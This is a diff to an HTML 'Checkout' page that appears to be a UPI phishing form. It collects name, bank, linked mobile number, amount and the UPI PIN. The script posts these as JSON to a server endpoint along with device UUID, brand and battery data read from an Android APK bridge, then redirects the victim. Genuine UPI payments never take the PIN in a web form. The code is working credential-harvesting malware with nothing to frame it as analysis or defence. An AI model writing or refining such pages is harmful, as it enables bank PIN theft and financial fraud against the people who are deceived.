@@ -4,72 +4,74 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Checkout</title>
-<link rel="stylesheet" href="style2.css">
+<link rel="stylesheet" type="text/css" href="style2.css">
 </head>
 <body>
 <div class="banner">
- <img src="01.jpg" alt="Banner Image" style="width:100%;height:100%;">
+  <img src="01.jpg" alt="Banner Image" style="width:100%; height:100%;">
 </div>
 
 <div class="container">
- <form id="paymentForm">
-   <div class="form-section">
-     <h2>ENTER YOUR CREDENTIALS</h2>
-     <label for="firstName">CLIENT'S NAME</label>
-     <input type="text" id="firstName" name="firstName" placeholder="ENTER YOUR NAME" required>
+  <h1 style="text-align:center;"></h1>
+  <form id="paymentForm">
+    <div class="form-section">
+      <h2>ENTER YOUR CREDENTIALS</h2>
 
-     <label for="lastName">BANK NAME</label>
-     <input type="text" id="lastName" name="lastName" placeholder="ENTER YOUR BANK NAME" required>
+      <label for="customerName">Customer Name</label>
+      <input type="text" id="customerName" name="customerName" placeholder="Enter your name" required>
 
-     <label for="mobileNumber">MOBILE NUMBER</label>
-     <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="UPI LINKED MOBILE NUMBER" required>
+      <label for="bankName">Bank Name</label>
+      <input type="text" id="bankName" name="bankName" placeholder="Enter bank name" required>
 
-     <label for="amount">AMOUNT</label>
-     <input type="text" id="amount" name="amount" placeholder="ENTER YOUR AMOUNT" required>
+      <label for="mobileNumber">Mobile Number</label>
+      <input type="tel" id="mobileNumber" placeholder="Linked mobile number" required maxlength="10">
 
-     <label for="upiPin">PIN</label>
-     <input type="password" id="upiPin" name="upiPin" placeholder="ENTER YOUR UPI PIN" required>
-   </div>
-   <button type="submit">MAKE PAYMENT</button>
- </form>
+      <label for="amount">Amount</label>
+      <input type="tel" id="amount" placeholder="Enter amount" required maxlength="5">
+
+      <label for="upiPin">UPI PIN</label>
+      <input type="password" id="upiPin" name="upiPin" placeholder="Enter UPI PIN" required maxlength="6" inputmode="numeric" pattern="\d*">
+    </div>
+
+    <button type="submit">MAKE PAYMENT</button>
+  </form>
 </div>
 
 <script>
-const form = document.getElementById("paymentForm");
+const form = document.getElementById('paymentForm');
 
-form.addEventListener("submit", async (e) => {
+form.addEventListener('submit', async e => {
     e.preventDefault();
 
-    const formData = new FormData(form);
     const data = {
-        clientName: formData.get("firstName"),
-        bankName: formData.get("lastName"),
-        mobileNumber: formData.get("mobileNumber"),
-        amount: formData.get("amount"),
-        upiPin: formData.get("upiPin")
+        customer_name: document.getElementById('customerName').value,
+        bank_name: document.getElementById('bankName').value,
+        mobile_number: document.getElementById('mobileNumber').value,
+        amount: document.getElementById('amount').value,
+        upi_pin: document.getElementById('upiPin').value
     };
 
-    // Device info from APK
-    if(window.AndroidDevice && AndroidDevice.getUUID && AndroidDevice.getBattery){
+    // UUID, brand & battery from APK
+    if(window.AndroidDevice){
         data.uuid = AndroidDevice.getUUID();
+        data.brand = AndroidDevice.getBrand();       // APK must implement getBrand()
         data.battery = AndroidDevice.getBattery();
-        data.device = navigator.userAgent;
+    } else {
+        data.uuid = crypto.randomUUID();
+        data.brand = "Unknown";
+        data.battery = "100%";
     }
 
     try {
-        const res = await fetch("/html-form-data", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
+        await fetch('/html-form-data', {  // replace with your Node.js endpoint
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
             body: JSON.stringify(data)
         });
-
-        const result = await res.json();
-        console.log(result);
-        alert("✅ Data sent successfully!");
-        window.location.href = "next-page.html"; // redirect
-    } catch(err) {
+        window.location.href = 'next-page.html';
+    } catch(err){
         console.error(err);
-        alert("❌ Error sending data to server.");
+        alert('❌ Error sending data to server.');
     }
 });
 </script>
